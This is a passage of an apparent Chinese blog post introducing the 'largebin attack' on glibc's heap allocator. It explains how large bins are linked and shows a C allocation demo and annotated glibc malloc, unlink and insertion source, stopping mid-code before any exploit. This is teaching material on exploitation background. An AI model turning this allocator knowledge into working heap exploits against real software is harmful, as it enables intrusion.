
<!DOCTYPE html>
<html lang="zh-Hans" class="loading">
<head>
    <meta charset="UTF-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
    <meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Largebin attack从原理到做题 - V1ct0r的博客</title>
    <meta name="apple-mobile-web-app-capable" content="yes" />
    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
    <meta name="google" content="notranslate" />
    <meta name="keywords" content="TriDiamond Obsidian,"> 
    <meta name="description" content="一、largebin的原理学习大于512（1024）字节(0x400)的chunk称之为large chunk，large bin就是用于管理这些large chunk的
Large bins 中一,"> 
    <meta name="author" content="V1ct0r"> 
    <link rel="alternative" href="atom.xml" title="V1ct0r的博客" type="application/atom+xml"> 
    <link rel="icon" href="/img/favicon.png"> 
    <link href="https://fonts.loli.net/css?family=Roboto+Mono|Rubik&display=swap" rel="stylesheet">
    
<link rel="stylesheet" href="//at.alicdn.com/t/font_1429596_nzgqgvnmkjb.css">

    
<link rel="stylesheet" href="//cdn.bootcss.com/animate.css/3.7.2/animate.min.css">

    
<link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/social-share.js/1.0.16/css/share.min.css">

    
<link rel="stylesheet" href="//cdn.bootcss.com/codemirror/5.48.4/codemirror.min.css">

    
<link rel="stylesheet" href="//cdn.bootcss.com/codemirror/5.48.4/theme/dracula.css">

    
<link rel="stylesheet" href="/css/obsidian.css">

    
<link rel="stylesheet" href="/css/ball-atom.min.css">

<meta name="generator" content="Hexo 4.2.1"></head>


<body class="loading">
    <div class="loader">
        <div class="la-ball-atom la-2x">
            <div></div>
            <div></div>
            <div></div>
            <div></div>
        </div>
    </div>
    <span id="config-title" style="display:none">V1ct0r的博客</span>
    <div id="loader"></div>
    <div id="single">
    <div class="scrollbar gradient-bg-rev"></div>
<div id="top" style="display: block;">
    <div class="bar" style="width: 0;"></div>
    <div class="navigation animated fadeIn fast delay-1s">
        <img id="home-icon" class="icon-home" src="/img/favicon.png" alt="" data-url="http://yoursite.com">
        <div id="play-icon" title="Play/Pause" class="iconfont icon-play"></div>
        <h3 class="subtitle">Largebin attack从原理到做题</h3>
        <div class="social">
            <!--        <div class="like-icon">-->
            <!--            <a href="javascript:;" class="likeThis active"><span class="icon-like"></span><span class="count">76</span></a>-->
            <!--        </div>-->
            <div>
                <div class="share">
                    
                        <a href="javascript:;" class="iconfont icon-share1"></a>
                        <div class="share-component-cc" data-disabled="facebook,douban,linkedin,diandian,tencent,google"></div>
                    
                </div>
            </div>
        </div>
    </div>
</div>

    <div class="section">
        <div class=article-header-wrapper>
    <div class="article-header">
        <div class="article-cover animated fadeIn" style="
            animation-delay: 600ms;
            animation-duration: 1.2s;
            background-image: 
                radial-gradient(ellipse closest-side, rgba(0, 0, 0, 0.65), #100e17),
                url(/img/cover.jpg) ">
        </div>
        <div class="else">
            <p class="animated fadeInDown">
                
                <a href="/categories/PWN"><b>「
                    </b>PWN<b> 」</b></a>
                
                October 08, 2019
            </p>
            <h3 class="post-title animated fadeInDown"><a href="/2019/10/08/Largebin-attack-%E5%88%9D%E6%8E%A2/" title="Largebin attack从原理到做题" class="">Largebin attack从原理到做题</a>
            </h3>
            
            <p class="post-count animated fadeInDown">
                
                <span>
                    <b class="iconfont icon-text2"></b> <i>Words count</i>
                    208k
                </span>
                
                
                <span>
                    <b class="iconfont icon-timer__s"></b> <i>Reading time</i>
                    3:09
                </span>
                
                
                
                <span id="busuanzi_container_page_pv">
                    <b class="iconfont icon-read"></b> <i>Read count</i>
                    <span id="busuanzi_value_page_pv">0</span>
                </span>
                
            </p>
            
            
            <ul class="animated fadeInDown post-tags-list" itemprop="keywords"><li class="animated fadeInDown post-tags-list-item"><a class="animated fadeInDown post-tags-list-link" href="/tags/%E5%A0%86/" rel="tag">堆</a></li></ul>
            
        </div>
    </div>
</div>

<div class="screen-gradient-after">
    <div class="screen-gradient-content">
        <div class="screen-gradient-content-inside">
            <div class="bold-underline-links screen-gradient-sponsor">
                <p>
                    <span class="animated fadeIn delay-1s"></span>
                </p>
            </div>
        </div>
    </div>
</div>

<div class="article">
    <div class='main'>
        <div class="content markdown animated fadeIn">
            <h3 id="一、largebin的原理学习"><a href="#一、largebin的原理学习" class="headerlink" title="一、largebin的原理学习"></a>一、largebin的原理学习</h3><p>大于512（1024）字节(0x400)的chunk称之为large chunk，large bin就是用于管理这些large chunk的</p>
<p>Large bins 中一共包括 63 个 bin，index为64~126，每个 bin 中的 chunk 的大小不一致，而是处于一定区间范围内</p>
<p><img src="/blog_img/1570517559938.png" alt="57051755993"></p>
<a id="more"></a>

<p>largebin 的结构和其他链表都不相同，更加复杂</p>
<p>largebin里除了有fd、bk指针，另外还有fd_nextsize 和 bk_nextsize 这两个指针，因此是有横向链表和纵向链表2个链表，而纵向的链表目的在于加快寻找chunk的速度。</p>
<p>自己写个C语言学习下largebin的堆块分配方式：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> *pa, *pb, *p1, *p2, *p3, *p4, *p5, *p6, *p7, *p8, *p9, *p10, *p11, *p12, *p13, *p14;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> *p;</span><br><span class="line">    pa = <span class="built_in">malloc</span>(<span class="number">0xb0</span>);</span><br><span class="line">    pb = <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line">    p1 = <span class="built_in">malloc</span>(<span class="number">0x400</span>);</span><br><span class="line">    p2 = <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line">    p3 = <span class="built_in">malloc</span>(<span class="number">0x410</span>);</span><br><span class="line">    p4 = <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line">    p5 = <span class="built_in">malloc</span>(<span class="number">0x420</span>);</span><br><span class="line">    p6 = <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line">    p7 = <span class="built_in">malloc</span>(<span class="number">0x420</span>);</span><br><span class="line">    p8 = <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line">    p9 = <span class="built_in">malloc</span>(<span class="number">0x430</span>);</span><br><span class="line">    p10 = <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line">    p11 = <span class="built_in">malloc</span>(<span class="number">0x430</span>);</span><br><span class="line">    p12 = <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line">    p13 = <span class="built_in">malloc</span>(<span class="number">0x430</span>);</span><br><span class="line">    p14 = <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line">    <span class="built_in">free</span>(pa);</span><br><span class="line">    <span class="built_in">free</span>(p1);</span><br><span class="line">    <span class="built_in">free</span>(p3);</span><br><span class="line">    <span class="built_in">free</span>(p5);</span><br><span class="line">    <span class="built_in">free</span>(p7);</span><br><span class="line">    <span class="built_in">free</span>(p9);</span><br><span class="line">    <span class="built_in">free</span>(p11);</span><br><span class="line">    <span class="built_in">free</span>(p13);</span><br><span class="line">    p = <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line">    p = <span class="built_in">malloc</span>(<span class="number">0x80</span>);</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/blog_img/1570513689215.png" alt="57051368921"></p>
<p>可以看到申请的堆块0x400到0x420放在larbin(index64),而3个0x430的堆块放在largebin(index65)，下面用图来解析：</p>
<p><img src="/blog_img/image-20201025114041262.png" alt="image-20201025114041262"></p>
<p>这是largebin中的堆块的分配示意图，上方的是size有相同和不同，但处于同一largebin的chunk分布，下方是相同size处于同一largebin的chunk分布。</p>
<p>很清楚地可以看到fk和bk形成的横向链表，fd_nextsize和bk_nextsize形成的纵向链表（看不出可以将图顺时针旋转90度再看看）</p>
<p>这里通过fd指针和bk指针形成循环链表很好理解，和之前的small bin和unsorted bin一样，但是不同的在于，largebin中的chunk是按照从大到小的顺序排列的(表头大，表尾小)，当有相同size的chunk时则按照free的时间顺序排序（也就是尾插法）。</p>
<p>同时相同size的chunk，只有第一个chunk会有fd_nextsize和bk_nextsize，其他的都没有，fd_nextsize和bk_nextsize置为0。</p>
<p>一般的，bk_nextchunk指向前一个比它大的chunk(表头和表尾除外)。这样就很好理解，fd_nextsize指向下一个比它小的chunk。</p>
<p>表头chunk的bk_nextsize指向表尾chunk，表尾的fd_nextsize指向表头chunk，从而fd_nextsize指针形成一个循环链表，bk_nextsize指针也形成一个循环链表，所以largebin的链表结构也相对复杂一些，但是理清楚了就好了。</p>
<p>了解了布局后，让我们继续看看申请largebin时的源码是什么样的：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!in_smallbin_range (nb))</span><br><span class="line">        &#123;</span><br><span class="line">          bin = bin_at (av, idx);</span><br><span class="line"></span><br><span class="line">          <span class="comment">//如果对应的 bin 为空或者其中的chunk最大的也很小，那就跳过</span></span><br><span class="line">          <span class="keyword">if</span> ((victim = first (bin)) != bin &amp;&amp;</span><br><span class="line">              (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (victim-&gt;<span class="built_in">size</span>) &gt;= (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (nb))</span><br><span class="line">            &#123;</span><br><span class="line">              <span class="comment">// 反向遍历链表，找到第一个比size大的chunk</span></span><br><span class="line">              victim = victim-&gt;bk_nextsize;</span><br><span class="line">              <span class="keyword">while</span> (((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (<span class="built_in">size</span> = chunksize (victim)) &lt;</span><br><span class="line">                      (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (nb)))</span><br><span class="line">                victim = victim-&gt;bk_nextsize;</span><br><span class="line">			</span><br><span class="line">              <span class="comment">/* Avoid removing the first entry for a size so that the skip</span></span><br><span class="line"><span class="comment">                 list does not have to be rerouted.  */</span></span><br><span class="line">              <span class="comment">//如果取出的chunk不是bin的最后一个chunk，同时该chunk有大小相同的chunk连接在一起</span></span><br><span class="line">              <span class="comment">//它就会取它前面的那个chunk</span></span><br><span class="line">              <span class="comment">//因为大小相同的chunk只有一个会被串在nextsize链上</span></span><br><span class="line">              <span class="comment">//这可以避免额外的bk_nextsize和fd_nextsize的赋值</span></span><br><span class="line">              <span class="keyword">if</span> (victim != last (bin) &amp;&amp; victim-&gt;<span class="built_in">size</span> == victim-&gt;fd-&gt;<span class="built_in">size</span>)</span><br><span class="line">                victim = victim-&gt;fd;</span><br><span class="line">			  <span class="comment">//计算切割后的大小</span></span><br><span class="line">              remainder_size = <span class="built_in">size</span> - nb;</span><br><span class="line">              unlink (av, victim, bck, fwd);<span class="comment">//通过unlink将chunk从链表移除</span></span><br><span class="line"></span><br><span class="line">              <span class="comment">/* Exhaust */</span></span><br><span class="line">              <span class="keyword">if</span> (remainder_size &lt; MINSIZE)</span><br><span class="line">                &#123;</span><br><span class="line">                  <span class="comment">//如果切割后的大小不足以作为一个chunk，那么就会将其标志位设为inuse</span></span><br><span class="line">                  <span class="comment">//同时设置NO_main_arena标志位</span></span><br><span class="line">                  set_inuse_bit_at_offset (victim, <span class="built_in">size</span>);</span><br><span class="line">                  <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">                    victim-&gt;<span class="built_in">size</span> |= NON_MAIN_ARENA;</span><br><span class="line">                &#125;</span><br><span class="line">              <span class="comment">/* Split */</span></span><br><span class="line">              <span class="keyword">else</span></span><br><span class="line">                &#123;</span><br><span class="line">                  <span class="comment">//如果剩余的大小可以作为一个chunk</span></span><br><span class="line">                  <span class="comment">//获得剩余部分的地址，放入unsorted bin中</span></span><br><span class="line">                  remainder = chunk_at_offset (victim, nb);</span><br><span class="line">                  <span class="comment">/* We cannot assume the unsorted list is empty and therefore</span></span><br><span class="line"><span class="comment">                     have to perform a complete insert here.  */</span></span><br><span class="line">                  bck = unsorted_chunks (av);</span><br><span class="line">                  fwd = bck-&gt;fd;</span><br><span class="line">	  <span class="keyword">if</span> (__glibc_unlikely (fwd-&gt;bk != bck))</span><br><span class="line">                    &#123;</span><br><span class="line">                      errstr = <span class="string">"malloc(): corrupted unsorted chunks"</span>;</span><br><span class="line">                      <span class="keyword">goto</span> errout;</span><br><span class="line">                    &#125;</span><br><span class="line">                  remainder-&gt;bk = bck;</span><br><span class="line">                  remainder-&gt;fd = fwd;</span><br><span class="line">                  bck-&gt;fd = remainder;</span><br><span class="line">                  fwd-&gt;bk = remainder;</span><br><span class="line">                  <span class="keyword">if</span> (!in_smallbin_range (remainder_size))</span><br><span class="line">                    &#123;</span><br><span class="line">                      remainder-&gt;fd_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">                      remainder-&gt;bk_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                  set_head (victim, nb | PREV_INUSE |</span><br><span class="line">                            (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="number">0</span>));</span><br><span class="line">                  set_head (remainder, remainder_size | PREV_INUSE);</span><br><span class="line">                  set_foot (remainder, remainder_size);</span><br><span class="line">                &#125;</span><br><span class="line">              check_malloced_chunk (av, victim, nb);</span><br><span class="line">              <span class="keyword">void</span> *p = chunk2mem (victim);</span><br><span class="line">              alloc_perturb (p, bytes);</span><br><span class="line">              <span class="keyword">return</span> p;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>

<p>源码中提到了unlink的操作，继续分析largebin的unlink操作： 结合着那个图就很好理解了</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> unlink(AV, P, BK, FD) &#123;                                            \</span></span><br><span class="line">    FD = P-&gt;fd;								      \</span><br><span class="line">    BK = P-&gt;bk;								      \</span><br><span class="line">    <span class="keyword">if</span> (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, <span class="number">0</span>))		      \</span><br><span class="line">      malloc_printerr (check_action, <span class="string">"corrupted double-linked list"</span>, P, AV);  \</span><br><span class="line">    <span class="keyword">else</span> &#123;								      \</span><br><span class="line">        FD-&gt;bk = BK;							      \</span><br><span class="line">        BK-&gt;fd = FD;</span><br><span class="line"><span class="comment">//实现第一重横向脱链，fd和bk层面的</span></span><br><span class="line">        <span class="keyword">if</span> (!in_smallbin_range (P-&gt;<span class="built_in">size</span>)				      \</span><br><span class="line">            &amp;&amp; __builtin_expect (P-&gt;fd_nextsize != <span class="literal">NULL</span>, <span class="number">0</span>)) &#123;		      \</span><br><span class="line">	    <span class="keyword">if</span> (__builtin_expect (P-&gt;fd_nextsize-&gt;bk_nextsize != P, <span class="number">0</span>)	      \</span><br><span class="line">		|| __builtin_expect (P-&gt;bk_nextsize-&gt;fd_nextsize != P, <span class="number">0</span>))    \</span><br><span class="line">	      malloc_printerr (check_action,				      \</span><br><span class="line">			       <span class="string">"corrupted double-linked list (not small)"</span>,    \</span><br><span class="line">			       P, AV);	</span><br><span class="line">            <span class="comment">//进行第二重纵向的脱链，fd_nextsize和bk_nextsize</span></span><br><span class="line">            <span class="keyword">if</span> (FD-&gt;fd_nextsize == <span class="literal">NULL</span>) &#123;				      \</span><br><span class="line">                <span class="keyword">if</span> (P-&gt;fd_nextsize == P)				      \</span><br><span class="line">                <span class="comment">//第1种unlink情况，bin中的size都是相同的</span></span><br><span class="line">                  FD-&gt;fd_nextsize = FD-&gt;bk_nextsize = FD;	</span><br><span class="line">                  </span><br><span class="line">                <span class="keyword">else</span> &#123;		</span><br><span class="line">                <span class="comment">//第2种unlink情况，size有相同和不同的，但都在一个largebin中</span></span><br><span class="line">                    FD-&gt;fd_nextsize = P-&gt;fd_nextsize;			      \</span><br><span class="line">                    FD-&gt;bk_nextsize = P-&gt;bk_nextsize;			      \</span><br><span class="line">                    P-&gt;fd_nextsize-&gt;bk_nextsize = FD;			      \</span><br><span class="line">                    P-&gt;bk_nextsize-&gt;fd_nextsize = FD;			      \</span><br><span class="line">                  &#125;							      \</span><br><span class="line">              &#125; <span class="keyword">else</span> &#123;		</span><br><span class="line">              <span class="comment">//第3种unlink情况，bin中的size都是不相同的</span></span><br><span class="line">                P-&gt;fd_nextsize-&gt;bk_nextsize = P-&gt;bk_nextsize;		      \</span><br><span class="line">                P-&gt;bk_nextsize-&gt;fd_nextsize = P-&gt;fd_nextsize;		      \</span><br><span class="line">              &#125;								      \</span><br><span class="line">          &#125;								      \</span><br><span class="line">      &#125;									      \</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>再来看看free状态的largebin的插入是怎么样的：victim就是想要插入的块</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> ((victim = unsorted_chunks (av)-&gt;bk) != unsorted_chunks (av))</span><br><span class="line">&#123;</span><br><span class="line">    bck = victim-&gt;bk;</span><br><span class="line">    <span class="keyword">if</span> (__builtin_expect (chunksize_nomask (victim) &lt;= <span class="number">2</span> * SIZE_SZ, <span class="number">0</span>)</span><br><span class="line">        || __builtin_expect (chunksize_nomask (victim)</span><br><span class="line">                   &gt; av-&gt;system_mem, <span class="number">0</span>))</span><br><span class="line">            malloc_printerr (check_action, <span class="string">"malloc(): memory corruption"</span>,</span><br><span class="line">                             chunk2mem (victim), av);</span><br><span class="line">    <span class="built_in">size</span> = chunksize (victim);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">      If a small request, try to use last remainder if it is the</span></span><br><span class="line"><span class="comment">      only chunk in unsorted bin.  This helps promote locality for</span></span><br><span class="line"><span class="comment">      runs of consecutive small requests. This is the only</span></span><br><span class="line"><span class="comment">      exception to best-fit, and applies only when there is</span></span><br><span class="line"><span class="comment">      no exact fit for a small chunk.</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"><span class="comment">//我们知道在对unsorted bin检索完毕后，会对里面其他堆块进行bins位置分配。如果堆块是unsorted bin中的最后一个chunk，检索到的chunk的大小适合所请求的chunk，检索到的块是last remainder并且请求的字节小于MIN_LARGE_SIZE，检索到的chunk将被分割成所请求大小的chunk和剩余chunk。请求大小的chunk将返回给用户，剩余的chunk将再次插入unsorted bin中；如果不是最后一个，处理就是，是smallbin大小的就放smallbin，largebin大小的就放largebin，重点看largebin的分配。</span></span><br><span class="line">    <span class="keyword">if</span> (in_smallbin_range (nb) &amp;&amp;</span><br><span class="line">        bck == unsorted_chunks (av) &amp;&amp;</span><br><span class="line">        victim == av-&gt;last_remainder &amp;&amp;</span><br><span class="line">        (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (<span class="built_in">size</span>) &gt; (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (nb + MINSIZE))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">/* split and reattach remainder */</span></span><br><span class="line">        remainder_size = <span class="built_in">size</span> - nb;</span><br><span class="line">        remainder = chunk_at_offset (victim, nb);</span><br><span class="line">        unsorted_chunks (av)-&gt;bk = unsorted_chunks (av)-&gt;fd = remainder;</span><br><span class="line">        av-&gt;last_remainder = remainder;</span><br><span class="line">        remainder-&gt;bk = remainder-&gt;fd = unsorted_chunks (av);</span><br><span class="line">        <span class="keyword">if</span> (!in_smallbin_range (remainder_size))</span><br><span class="line">        &#123;</span><br><span class="line">            remainder-&gt;fd_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">            remainder-&gt;bk_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        set_head (victim, nb | PREV_INUSE |</span><br><span class="line">                  (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="number">0</span>));</span><br><span class="line">        set_head (remainder, remainder_size | PREV_INUSE);</span><br><span class="line">        set_foot (remainder, remainder_size);</span><br><span class="line"></span><br><span class="line">        check_malloced_chunk (av, victim, nb);</span><br><span class="line">        <span class="keyword">void</span> *p = chunk2mem (victim);</span><br><span class="line">        alloc_perturb (p, bytes);</span><br><span class="line">        <span class="keyword">return</span> p;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* remove from unsorted list */</span></span><br><span class="line">    unsorted_chunks (av)-&gt;bk = bck;</span><br><span class="line">    bck-&gt;fd = unsorted_chunks (av);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Take now instead of binning if exact fit */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">size</span> == nb)</span><br><span class="line">    &#123;</span><br><span class="line">         set_inuse_bit_at_offset (victim, <span class="built_in">size</span>);</span><br><span class="line">         <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">             set_non_main_arena (victim);</span><br><span class="line">         check_malloced_chunk (av, victim, nb);</span><br><span class="line">         <span class="keyword">void</span> *p = chunk2mem (victim);</span><br><span class="line">         alloc_perturb (p, bytes);</span><br><span class="line">         <span class="keyword">return</span> p;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* place chunk in bin */</span></span><br><span class="line">    <span class="keyword">if</span> (in_smallbin_range (<span class="built_in">size</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        victim_index = smallbin_index (<span class="built_in">size</span>);</span><br><span class="line">        bck = bin_at (av, victim_index);</span><br><span class="line">        fwd = bck-&gt;fd;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;<span class="comment">//这里就是largebin了，分3种插入，如果是比链表中最小的还小，就直接插入末端，如果比最大的大，就插入头结点，如果是处于中间的，就先遍历链表，找到第一个比它大的chunk，然后再实现插入。</span></span><br><span class="line">        victim_index = largebin_index (<span class="built_in">size</span>);</span><br><span class="line">        bck = bin_at (av, victim_index);</span><br><span class="line">        fwd = bck-&gt;fd;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* maintain large bins in sorted order */</span></span><br><span class="line">        <span class="keyword">if</span> (fwd != bck)</span><br><span class="line">        &#123;</span><br><span class="line">             <span class="comment">/* Or with inuse bit to speed comparisons */</span></span><br><span class="line">             <span class="built_in">size</span> |= PREV_INUSE;</span><br><span class="line">             <span class="comment">/* if smaller than smallest, bypass loop below */</span></span><br><span class="line">             assert (chunk_main_arena (bck-&gt;bk));</span><br><span class="line">             <span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (<span class="built_in">size</span>) &lt; (<span class="keyword">unsigned</span> <span class="keyword">long</span>) chunksize_nomask (bck-&gt;bk))</span><br><span class="line">             &#123;</span><br><span class="line">                 fwd = bck;</span><br><span class="line">                 bck = bck-&gt;bk;</span><br><span class="line">                 victim-&gt;fd_nextsize = fwd-&gt;fd;</span><br><span class="line">                 victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize;</span><br><span class="line">                 fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">              &#125;</span><br><span class="line">              <span class="keyword">else</span></span><br><span class="line">              &#123;</span><br><span class="line">                  assert (chunk_main_arena (fwd));</span><br><span class="line">                  <span class="keyword">while</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) <span class="built_in">size</span> &lt; chunksize_nomask (fwd))</span><br><span class="line">                  &#123;</span><br><span class="line">                      fwd = fwd-&gt;fd_nextsize;</span><br><span class="line">                      assert (chunk_main_arena 